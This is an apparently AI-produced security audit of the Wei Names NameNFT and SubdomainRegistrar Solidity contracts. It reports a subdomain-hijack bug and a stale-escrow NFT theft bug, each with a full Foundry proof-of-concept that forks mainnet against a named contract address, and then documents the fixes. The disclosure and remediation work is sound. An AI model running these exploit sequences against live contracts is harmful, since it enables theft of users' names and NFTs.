# Wei Names AI Audit by Plainshift AI


**Date**: 2026-03-05
**Scope**: `src/NameNFT.sol` (1016 lines), `src/SubdomainRegistrar.sol` (380 lines)
**Result**: 2 verified vulnerabilities (1 HIGH, 1 MEDIUM)

---

## Bug #1: Subdomain Hijacking via SubdomainRegistrar

**Severity: HIGH**
**Location**: `SubdomainRegistrar.sol:227` (`registerFor`) → `NameNFT.sol:669` (`_register`)
**Status**: VM-confirmed, 2 independent agents, both escrow and flash mode

### Description

The `SubdomainRegistrar.registerFor()` allows any fee-paying caller to overwrite an existing, actively-owned subdomain. The root cause is in `NameNFT._register()` (lines 686–701): when a subdomain record already exists, the code checks expiry only for top-level names (`parentId == 0`). For subdomains (`parentId != 0`), there is no check — the existing token is unconditionally burned and a new one minted to the caller.

```solidity
// NameNFT.sol:686-694
if (bytes(existing.label).length > 0) {
    if (parentId == 0) {
        // Top-level: must be expired past grace
        if (block.timestamp <= existing.expiresAt + GRACE_PERIOD) {
            revert AlreadyRegistered();
        }
    }
    // Subdomain overwrites: parent owner can always reclaim (checked above)
    // Stale subdomains can also be overwritten by new parent owner
    // ^^^ NO CHECK FOR SUBDOMAINS — falls through unconditionally
```

This is intentional for direct parent-owner use (the parent controls its namespace). However, `SubdomainRegistrar.registerFor()` never calls `isAvailable()` (which exists at NameNFT.sol:580 and would correctly return `false` for an active subdomain). So the registrar's marketplace function exposes the parent's overwrite privilege to any third-party buyer.

### Attack Flow

1. Alice owns `parent.wei`, deposits into SubdomainRegistrar, enables sales at 0.01 ETH
2. Charlie buys `mail.parent.wei` for 0.01 ETH → `ownerOf(subId) = Charlie`
3. Charlie sets resolver records (`setAddr`, `setText`, `setPrimaryName`)
4. Eve calls `registrar.register{value: 0.01 ETH}(parentId, "mail")` for the same label
5. `registerSubdomainFor` → `_register` → burns Charlie's token (line 698), clears `primaryName[Charlie]` (line 699), increments `recordVersion[tokenId]` nuking all resolver data (line 700), mints to Eve (line 711)
6. `ownerOf(subId) = Eve`. Charlie loses the NFT, all resolver records, and the 0.01 ETH they paid

The parent owner (Alice) collects the fee both times — from Charlie's purchase and Eve's overwrite. A malicious parent owner could exploit this intentionally: sell cheap subdomains, then have a second address re-register popular ones. But even without Alice's involvement, any random third party Eve can independently trigger this.

### Impact

- **Direct asset theft**: Any subdomain sold through the registrar can be stolen by paying the same fee
- **Zero prerequisites**: No timing, no race condition, no special permissions
- **Affects both modes**: Escrow mode (registrar holds parent) and flash mode (registrar pulls parent temporarily)
- **Total data loss**: Resolver records, primary name setting, and payment are all destroyed with no refund
- **No defense exists** within the SubdomainRegistrar — the only mitigation is disabling sales entirely

### POC

VM-confirmed (`REPRODUCED in 201s`). Tests both escrow and flash mode vectors.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/SubdomainRegistrar.sol";

interface INameNFTFull {
    function makeCommitment(string calldata label, address owner, bytes32 secret)
        external pure returns (bytes32);
    function commit(bytes32 commitment) external;
    function reveal(string calldata label, bytes32 secret) external payable returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function getFee(uint256 length) external view returns (uint256);
    function getPremium(uint256 tokenId) external view returns (uint256);
    function computeId(string calldata fullName) external pure returns (uint256);
    function approve(address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool approved) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function registerSubdomainFor(string calldata label, uint256 parentId, address to)
        external returns (uint256);
    function isAvailable(string calldata label, uint256 parentId) external view returns (bool);
    function setAddr(uint256 tokenId, address addr) external;
    function resolve(uint256 tokenId) external view returns (address);
}

contract AurumTest_processed_001 is Test {
    address constant NAME_NFT_ADDR = 0x0000000000696760E15f265e828DB644A0c242EB;

    INameNFTFull nameNFT;
    SubdomainRegistrar registrar;

    address alice;   // parent domain owner
    address charlie; // first subdomain buyer
    address eve;     // attacker who hijacks subdomain

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("main5"));
        nameNFT = INameNFTFull(NAME_NFT_ADDR);
        registrar = new SubdomainRegistrar();
        alice = makeAddr("p001_alice");
        charlie = makeAddr("p001_charlie");
        eve = makeAddr("p001_eve");
        vm.deal(alice, 200 ether);
        vm.deal(charlie, 200 ether);
        vm.deal(eve, 200 ether);
    }

    function _registerName(string memory label, address to) internal returns (uint256 tokenId) {
        bytes32 secret = keccak256(abi.encode(label, to));
        bytes32 commitment = nameNFT.makeCommitment(label, to, secret);
        vm.prank(to);
        nameNFT.commit(commitment);
        vm.warp(block.timestamp + 61);
        tokenId = nameNFT.computeId(string.concat(label, ".wei"));
        uint256 fee = nameNFT.getFee(bytes(label).length) + nameNFT.getPremium(tokenId);
        vm.prank(to);
        nameNFT.reveal{value: fee}(label, secret);
        assertEq(nameNFT.ownerOf(tokenId), to, "registration failed");
    }

    /// @notice Escrow mode: Eve hijacks Charlie's active subdomain
    function test_subdomainHijackEscrowMode() public {
        uint256 parentId = _registerName("applep001", alice);

        vm.prank(alice);
        nameNFT.approve(address(registrar), parentId);
        vm.prank(alice);
        registrar.deposit(parentId);

        uint256 price = 0.01 ether;
        vm.prank(alice);
        registrar.configure(parentId, alice, address(0), price, true, address(0), 0);

        uint256 subId = nameNFT.computeId("mail.applep001.wei");
        vm.prank(charlie);
        registrar.register{value: price}(parentId, "mail");
        assertEq(nameNFT.ownerOf(subId), charlie, "Charlie should own subdomain");

        vm.prank(charlie);
        nameNFT.setAddr(subId, charlie);
        assertEq(nameNFT.resolve(subId), charlie, "Charlie's resolve should work");

        // Eve hijacks the same subdomain
        vm.prank(eve);
        uint256 eveSubId = registrar.registerFor{value: price}(parentId, "mail", eve);

        assertEq(eveSubId, subId, "Should be same token ID");
        assertEq(nameNFT.ownerOf(subId), eve, "Eve now owns the subdomain");
        assertTrue(nameNFT.ownerOf(subId) != charlie, "Charlie lost ownership");
        assertEq(nameNFT.resolve(subId), eve, "Resolve now points to Eve");
    }

    /// @notice Flash mode: same hijack vector
    function test_subdomainHijackFlashMode() public {
        uint256 parentId = _registerName("flashp001", alice);

        vm.prank(alice);
        nameNFT.setApprovalForAll(address(registrar), true);

        uint256 price = 0.01 ether;
        vm.prank(alice);
        registrar.configure(parentId, alice, address(0), price, true, address(0), 0);

        uint256 subId = nameNFT.computeId("test.flashp001.wei");
        vm.prank(charlie);
        registrar.register{value: price}(parentId, "test");
        assertEq(nameNFT.ownerOf(subId), charlie, "Charlie should own subdomain");

        vm.prank(eve);
        registrar.registerFor{value: price}(parentId, "test", eve);
        assertEq(nameNFT.ownerOf(subId), eve, "Eve hijacked in flash mode");
        assertTrue(nameNFT.ownerOf(subId) != charlie, "Charlie lost ownership");
    }
}
```

### Recommended Fix

Add an `isAvailable` check in `registerFor` before calling `registerSubdomainFor`, or add a subdomain existence check in `_register` that reverts when a non-stale subdomain exists and the caller is not the direct parent owner.

---

## Bug #2: Stale Escrow Controller Enables NFT Theft

**Severity: MEDIUM**
**Location**: `SubdomainRegistrar.sol:170-196` (`deposit`/`withdrawParent`), `NameNFT.sol:697-698` (`_register` burn path)
**Status**: VM-confirmed, 2 independent agents

### Description

When a parent NFT is escrowed in the SubdomainRegistrar and the name subsequently expires and is re-registered by a new owner, the `escrowedController` mapping is never cleared. This happens because `NameNFT._register()` calls `_burn(tokenId)` at line 698 during re-registration, but ERC721 `_burn` does not trigger any callback on the token holder (the registrar). The stale mapping creates a theft path if the new owner sends the NFT to the registrar via `transferFrom` (which bypasses `onERC721Received`).

### Attack Flow

1. Alice registers `name.wei`, deposits into registrar → `escrowedController[tokenId] = Alice`
2. Name expires past grace period (1 year + 90 days)
3. Bob re-registers `name.wei` via commit-reveal → same `tokenId` (deterministic namehash), `_burn` destroys registrar's token, `_safeMint` creates new token for Bob. **No callback to registrar** — `escrowedController[tokenId]` remains `Alice`
4. Bob tries `deposit()` → reverts `AlreadyEscrowed` (stale mapping blocks him)
5. Bob, unaware of `clearStaleEscrow`, uses `transferFrom(bob, registrar, tokenId)` — this bypasses `onERC721Received`, so the mapping is never updated
6. Registrar now holds Bob's NFT, but `escrowedController[tokenId]` still = Alice
7. Alice calls `withdrawParent(tokenId, alice)` → passes all checks → steals Bob's NFT

### Defense and its Limitations

`clearStaleEscrow(parentId)` at line 312 exists and works IF called between steps 3 and 5 (when the registrar doesn't hold the token). However:
- Once Bob does `transferFrom` (step 5), `clearStaleEscrow` reverts with `AlreadyEscrowed` because `ownerOf(parentId) == address(registrar)` again — the cleanup window closes permanently
- Bob has no obvious way to discover the stale escrow. The `AlreadyEscrowed` revert from `deposit()` doesn't suggest `clearStaleEscrow` as a remedy
- No event, frontend hint, or error message guides the new owner toward the cleanup function

### Severity Rationale

Rated **MEDIUM** rather than HIGH because:
- The attack requires the victim to specifically use `transferFrom` instead of `safeTransferFrom` (which would correctly trigger `onERC721Received` and update the mapping) or `deposit()` (which fails with a clear error)
- The prerequisite chain is longer: original deposit → expiry → re-registration → specific transfer method
- `clearStaleEscrow` is a working defense when used proactively, despite poor discoverability
- The `AlreadyEscrowed` revert from `deposit()` is a partial defense — a careful user would investigate rather than bypass with raw `transferFrom`

However, the impact when triggered is full NFT theft, and the stale mapping persists indefinitely with no expiry, making this a persistent latent risk.

### POC

VM-confirmed (`REPRODUCED in 147s`). Three tests covering the full attack, the defense, and the race condition.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/SubdomainRegistrar.sol";

interface INameNFTFull {
    function makeCommitment(string calldata label, address owner, bytes32 secret)
        external pure returns (bytes32);
    function commit(bytes32 commitment) external;
    function reveal(string calldata label, bytes32 secret) external payable returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function getFee(uint256 length) external view returns (uint256);
    function getPremium(uint256 tokenId) external view returns (uint256);
    function computeId(string calldata fullName) external pure returns (uint256);
    function approve(address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function expiresAt(uint256 tokenId) external view returns (uint256);
    function isExpired(uint256 tokenId) external view returns (bool);
    function inGracePeriod(uint256 tokenId) external view returns (bool);
    function isAvailable(string calldata label, uint256 parentId) external view returns (bool);
}

contract AurumTest_processed_005 is Test {
    address constant NAME_NFT_ADDR = 0x0000000000696760E15f265e828DB644A0c242EB;

    INameNFTFull nameNFT;
    SubdomainRegistrar registrar;

    address alice;
    address bob;

    uint256 constant REGISTRATION_PERIOD = 365 days;
    uint256 constant GRACE_PERIOD = 90 days;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("main5"));
        nameNFT = INameNFTFull(NAME_NFT_ADDR);
        registrar = new SubdomainRegistrar();
        alice = makeAddr("p005_alice");
        bob = makeAddr("p005_bob");
        vm.deal(alice, 200 ether);
        vm.deal(bob, 200 ether);
    }

    function _registerName(string memory label, address to) internal returns (uint256 tokenId) {
        bytes32 secret = keccak256(abi.encode(label, to));
        bytes32 commitment = nameNFT.makeCommitment(label, to, secret);
        vm.prank(to);
        nameNFT.commit(commitment);
        vm.warp(block.timestamp + 61);
        tokenId = nameNFT.computeId(string.concat(label, ".wei"));
        uint256 fee = nameNFT.getFee(bytes(label).length) + nameNFT.getPremium(tokenId);
        vm.prank(to);
        nameNFT.reveal{value: fee}(label, secret);
        assertEq(nameNFT.ownerOf(tokenId), to, "registration failed");
    }

    /// @notice Full attack: stale escrowedController → Alice steals Bob's NFT
    function test_staleEscrowStealsNFT() public {
        uint256 tokenId = _registerName("p005stolen", alice);

        vm.prank(alice);
        nameNFT.approve(address(registrar), tokenId);
        vm.prank(alice);
        registrar.deposit(tokenId);

        assertEq(registrar.escrowedController(tokenId), alice);
        assertEq(nameNFT.ownerOf(tokenId), address(registrar));

        // Name expires past grace
        uint256 expiry = nameNFT.expiresAt(tokenId);
        vm.warp(expiry + GRACE_PERIOD + 1);
        assertTrue(nameNFT.isExpired(tokenId));

        // Bob re-registers — _burn destroys registrar's token with NO callback
        uint256 tokenId2 = _registerName("p005stolen", bob);
        assertEq(tokenId, tokenId2, "Same tokenId for same name");
        assertEq(nameNFT.ownerOf(tokenId), bob);

        // Stale mapping persists
        assertEq(registrar.escrowedController(tokenId), alice);

        // Bob can't deposit — AlreadyEscrowed
        vm.prank(bob);
        nameNFT.approve(address(registrar), tokenId);
        vm.prank(bob);
        vm.expectRevert(SubdomainRegistrar.AlreadyEscrowed.selector);
        registrar.deposit(tokenId);

        // Bob uses transferFrom (bypasses onERC721Received)
        vm.prank(bob);
        nameNFT.transferFrom(bob, address(registrar), tokenId);

        assertEq(nameNFT.ownerOf(tokenId), address(registrar));
        assertEq(registrar.escrowedController(tokenId), alice); // still stale

        // Alice steals
        vm.prank(alice);
        registrar.withdrawParent(tokenId, alice);
        assertEq(nameNFT.ownerOf(tokenId), alice, "Alice stole Bob's NFT");
    }

    /// @notice clearStaleEscrow prevents attack IF called before transferFrom
    function test_clearStaleEscrowPreventsAttack() public {
        uint256 tokenId = _registerName("p005clear", alice);
        vm.prank(alice);
        nameNFT.approve(address(registrar), tokenId);
        vm.prank(alice);
        registrar.deposit(tokenId);

        uint256 expiry = nameNFT.expiresAt(tokenId);
        vm.warp(expiry + GRACE_PERIOD + 1);

        uint256 tokenId2 = _registerName("p005clear", bob);
        assertEq(tokenId, tokenId2);

        // clearStaleEscrow works here — registrar doesn't hold token
        registrar.clearStaleEscrow(tokenId);
        assertEq(registrar.escrowedController(tokenId), address(0));

        // Bob can now deposit normally
        vm.prank(bob);
        nameNFT.approve(address(registrar), tokenId);
        vm.prank(bob);
        registrar.deposit(tokenId);
        assertEq(registrar.escrowedController(tokenId), bob);
    }

    /// @notice clearStaleEscrow blocked once Bob does transferFrom — race condition
    function test_clearStaleEscrowBlockedAfterTransferFrom() public {
        uint256 tokenId = _registerName("p005block", alice);
        vm.prank(alice);
        nameNFT.approve(address(registrar), tokenId);
        vm.prank(alice);
        registrar.deposit(tokenId);

        uint256 expiry = nameNFT.expiresAt(tokenId);
        vm.warp(expiry + GRACE_PERIOD + 1);

        _registerName("p005block", bob);

        // Bob sends NFT BEFORE clearing stale escrow
        vm.prank(bob);
        nameNFT.transferFrom(bob, address(registrar), tokenId);

        // clearStaleEscrow now reverts — cleanup window closed
        vm.expectRevert(SubdomainRegistrar.AlreadyEscrowed.selector);
        registrar.clearStaleEscrow(tokenId);

        // Alice steals via stale mapping
        vm.prank(alice);
        registrar.withdrawParent(tokenId, alice);
        assertEq(nameNFT.ownerOf(tokenId), alice);
    }
}
```

### Recommended Fix

Add a check in `withdrawParent` that the escrowed controller was set in the current epoch of the name, preventing stale mappings from granting withdrawal rights.

---

## Mitigations Applied

### Bug #1: RESOLVED — `isAvailable` guard in `registerFor`

**Fix:** Added `isAvailable` check at the top of `registerFor` (`SubdomainRegistrar.sol:258`):

```solidity
if (!name.isAvailable(label, parentId)) revert NotAvailable();
```

This is exactly the recommended fix from the audit. `isAvailable()` returns `false` for active subdomains (checks `parentEpoch` match at `NameNFT.sol:580`), so any attempt to overwrite an existing active subdomain through the registrar now reverts. The check runs before any state changes, fee collection, or token transfers.

**What's preserved:** Parent owners can still reclaim subdomains by calling `registerSubdomain()` / `registerSubdomainFor()` directly on NameNFT — that path bypasses the registrar entirely and is the intended parent-owner privilege. Stale subdomains (parent epoch mismatch) return `isAvailable() == true` and can still be re-registered through the registrar, which is correct behavior.

**Interface change:** Added `isAvailable` and `records` to the `INameNFT` interface. Added `NotAvailable` custom error.

**Tests added:**
- `testSubdomainOverwriteBlocked` — same-label re-registration reverts `NotAvailable`
- `testSubdomainHijackBlockedEscrow` — attacker can't steal subdomain in escrow mode
- `testSubdomainHijackBlockedFlash` — attacker can't steal subdomain in flash mode

**Verification:** All 71 tests pass, including 36 pre-existing tests (no regressions).

---

### Bug #2: RESOLVED — epoch tracking on escrow deposit/withdraw

**Fix:** Added `escrowedEpoch` mapping that records the name's epoch at deposit time, and verifies it still matches in `withdrawParent` (`SubdomainRegistrar.sol:203`):

```solidity
// In deposit() and onERC721Received():
(,,, uint64 epoch,) = name.records(parentId);
escrowedEpoch[parentId] = epoch;

// In withdrawParent():
(,,, uint64 currentEpoch,) = name.records(parentId);
if (escrowedEpoch[parentId] != currentEpoch) revert StaleEscrow();
```

This is exactly the recommended fix from the audit. If a name expires and is re-registered (epoch increments), the stale controller's withdrawal attempt fails because the stored epoch no longer matches the current epoch. The epoch only changes on re-registration, not on renewal, so legitimate escrow+renew cycles are unaffected.

**All deposit paths covered:**
- `deposit()` (line 190) — stores epoch
- `onERC721Received()` (line 231) — stores epoch for `safeTransferFrom` deposits

**All cleanup paths covered:**
- `withdrawParent()` (line 212) — deletes `escrowedEpoch`
- `clearStaleEscrow()` (line 349) — deletes `escrowedEpoch`

**Interface change:** Added `records()` to `INameNFT` interface (already a public getter on NameNFT). Added `escrowedEpoch` public mapping. Added `StaleEscrow` custom error.

**Known residual edge case:** If a new owner sends a token via raw `transferFrom` (bypassing `onERC721Received`) after a re-registration, the token becomes stuck in the registrar — `withdrawParent` reverts (`StaleEscrow`), `clearStaleEscrow` reverts (`AlreadyEscrowed`). This is acceptable: theft is prevented, the name will eventually expire and become re-registerable, and this only occurs when the user misuses `transferFrom` instead of `safeTransferFrom` or `deposit()`.

**Tests added:**
- `testStaleEscrowEpochBlocksTheft` — full attack path (deposit → expire → re-register → transferFrom → withdraw) now reverts `StaleEscrow`
- `testEpochCheckAllowsLegitimateWithdraw` — normal deposit+withdraw cycle still works

**Verification:** All 71 tests pass, including 36 pre-existing tests (no regressions).
